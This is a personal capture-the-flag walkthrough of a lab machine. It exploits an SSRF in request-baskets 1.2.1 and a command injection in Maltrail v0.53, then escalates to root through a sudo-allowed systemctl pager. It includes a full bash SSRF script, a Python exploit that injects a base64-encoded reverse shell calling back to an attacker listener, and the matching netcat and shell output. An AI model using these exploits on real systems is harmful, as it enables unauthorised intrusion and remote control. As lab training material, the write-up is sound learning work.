```
sudo nmap -sS -sV -p- 10.10.11.224
[sudo] password for wizardwalter: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 20:01 EDT
Nmap scan report for 10.10.11.224
Host is up (0.031s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     http    Golang net/http server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.95%I=7%D=8/19%Time=68A5107E%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;\
SF:x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Wed,\x2020\x20Aug\x20
SF:2025\x2000:18:55\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"/w
SF:eb\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x202
SF:00\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Wed,\x2020\x20Aug\x20
SF:2025\x2000:18:55\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest
SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20
SF:Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Co
SF:ntent-Type-Options:\x20nosniff\r\nDate:\x20Wed,\x2020\x20Aug\x202025\x2
SF:000:19:11\x20GMT\r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20n
SF:ame;\x20the\x20name\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\
SF:-_\\\.\]{1,250}\$\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20cl
SF:ose\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Socks5,67,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=ut
SF:f-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(OfficeScan
SF:,A3,"HTTP/1\.1\x20400\x20Bad\x20Request:\x20missing\x20required\x20Host
SF:\x20header\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnecti
SF:on:\x20close\r\n\r\n400\x20Bad\x20Request:\x20missing\x20required\x20Ho
SF:st\x20header");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

if i go to the site on port 55555 as the others are filtered, i notice it is powered by request-baskets version 1.2.1:
upon a quick google search I can tell that is vulnerable to :
`CVE-2023-27163`

which is a Server-Side Request Forgery vulnerability... lets exploit!

```
#!/bin/bash
set -euo pipefail

if [[ $# -lt 2 || ${1:-} == "-h" || ${1:-} == "--help" ]]; then
  cat <<'USAGE'
Usage: exploit.sh <URL> <TARGET>

Arguments:
  URL     Base URL of the vulnerable Request-Baskets server (e.g. http://127.0.0.1:5000/)
  TARGET  Where to SSRF to (e.g. http://127.0.0.1:2375/ or http://YOURIP:8080/)
USAGE
  exit 1
fi

URL="$1"
ATTACKER_SERVER="$2"

# ensure trailing slash on URL
if [[ ${URL: -1} != "/" ]]; then
  URL="${URL}/"
fi

# random basket name
BASKET_NAME="$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c 6)"
API_URL="${URL}api/baskets/${BASKET_NAME}"

# configure proxy basket to forward to ATTACKER_SERVER
PAYLOAD=$(cat <<JSON
{"forward_url":"${ATTACKER_SERVER}","proxy_response":true,"insecure_tls":false,"expand_path":true,"capacity":250}
JSON
)

echo "> Creating the \"${BASKET_NAME}\" proxy basket..."
response="$(curl -sS -X POST -H 'Content-Type: application/json' -d "${PAYLOAD}" "${API_URL}")"

BASKET_URL="${URL}${BASKET_NAME}"
echo "> Basket created!"
echo "> Visiting ${BASKET_URL} will make the server request ${ATTACKER_SERVER}."

if command -v jq >/dev/null 2>&1; then
  echo "> Authorization: $(jq -r '.token' <<<"${response}")"
else
  echo "> Response body (Authorization): ${response}"
fi
```

i found this exploit digging through google... now lets try and use it:
....
i could not get it to work so instead lets just curl it manually and get the proxy bucket:
```
curl -sS -X POST \
  -H 'Content-Type: application/json' \
  -d '{"forward_url":"http://127.0.0.1:80/","proxy_response":true,"insecure_tls":false,"expand_path":true,"capacity":250}' \
  http://10.10.11.224:55555/api/baskets/pwn123


....
{"token":"-j8LwpSBKmAY5E1YCFNjIYuwAcWoGbrHShVDoZNcZG_D"}
```

nice now if i curl or go to :
```
http://10.10.11.224:55555/pwn123
```

i am able to see the site on port 80 :D

this is running mailtrail v0.53

vulnerable to RCE via : `https://github.com/spookier/Maltrail-v0.53-Exploit/blob/main/exploit.py`

This is a very simple and nice exploit, lets see if this one will work :D
```
'''
  ██████  ██▓███   ▒█████   ▒█████   ██ ▄█▀ ██▓▓█████  ██▀███  
▒██    ▒ ▓██░  ██▒▒██▒  ██▒▒██▒  ██▒ ██▄█▒ ▓██▒▓█   ▀ ▓██ ▒ ██▒
░ ▓██▄   ▓██░ ██▓▒▒██░  ██▒▒██░  ██▒▓███▄░ ▒██▒▒███   ▓██ ░▄█ ▒
  ▒   ██▒▒██▄█▓▒ ▒▒██   ██░▒██   ██░▓██ █▄ ░██░▒▓█  ▄ ▒██▀▀█▄  
▒██████▒▒▒██▒ ░  ░░ ████▓▒░░ ████▓▒░▒██▒ █▄░██░░▒████▒░██▓ ▒██▒
▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░▓  ░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒  ░ ░░▒ ░       ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░ ▒ ░ ░ ░  ░  ░▒ ░ ▒░
░  ░  ░  ░░       ░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░  ▒ ░   ░     ░░   ░ 
      ░               ░ ░      ░ ░  ░  ░    ░     ░  ░   ░     
'''

import sys;
import os;
import base64;

def main():
	listening_IP = None
	listening_PORT = None
	target_URL = None

	if len(sys.argv) != 4:
		print("Error. Needs listening IP, PORT and target URL.")
		return(-1)
	
	listening_IP = sys.argv[1]
	listening_PORT = sys.argv[2]
	target_URL = sys.argv[3] + "/login"
	print("Running exploit on " + str(target_URL))
	curl_cmd(listening_IP, listening_PORT, target_URL)

def curl_cmd(my_ip, my_port, target_url):
	payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
	encoded_payload = base64.b64encode(payload.encode()).decode()  # encode the payload in Base64
	command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
	os.system(command)

if __name__ == "__main__":
  main()
```

```
python3 ./exploit.py 10.10.14.25 1337 http://10.10.11.224:55555/pwn123
```

bang!

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.11.224] 53196
$ whoami
whoami
puma
```

```
$ cd ~
cd ~
$ ls
ls
user.txt
$ cat user.txt
cat user.txt
bb7e030a443173**********
```

----
### Priv Esc

lets spawn a better shell:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
next:
`sudo -l`

```
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

oooo

lets check version:
```
systemctl --version
systemd 245 (245.4-4ubuntu3.22)
```

nice and again with a google search we find vuln to:
`CVE-2023-26604`

Lets exploit!
`sudo /usr/bin/systemctl status trail.service`

it pops this open:
```
WARNING: terminal is not fully functional
-  (press RETURN)
● trail.service - Maltrail. Server of malicious traffic detection system
     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset:>
     Active: active (running) since Tue 2025-08-19 02:20:04 UTC; 23h ago
       Docs: https://github.com/stamparm/maltrail#readme
             https://github.com/stamparm/maltrail/wiki
   Main PID: 921 (python3)
      Tasks: 58 (limit: 4662)
     Memory: 91.1M
     CGroup: /system.slice/trail.service
             ├─ 921 /usr/bin/python3 server.py
             ├─1772 /bin/sh -c logger -p auth.info -t "maltrail[921]" "Failed p>
             ├─1774 /bin/sh -c logger -p auth.info -t "maltrail[921]" "Failed p>
             ├─1778 sh
             ├─1783 python3 -c import socket,os,pty;s=socket.socket(socket.AF_I>
             ├─1784 /bin/sh
             ├─1785 python3 -c import pty; pty.spawn("/bin/bash")
             ├─1786 /bin/bash
             ├─1811 sudo /usr/bin/systemctl status trail.service
             ├─1813 /usr/bin/systemctl status trail.service
             ├─1814 pager
             ├─1819 /bin/sh -c logger -p auth.info -t "maltrail[921]" "Failed p>
             ├─1820 /bin/sh -c logger -p auth.info -t "maltrail[921]" "Failed p>
             ├─1823 sh
```

since i am in crap terminal if i run !sh

it drops me right into a root shell:

```
!sh
!sshh!sh
# ls
m  user.txt
# cd /root
# cat root.txt
feee19721f5d**********
```

ROOT PWNED!
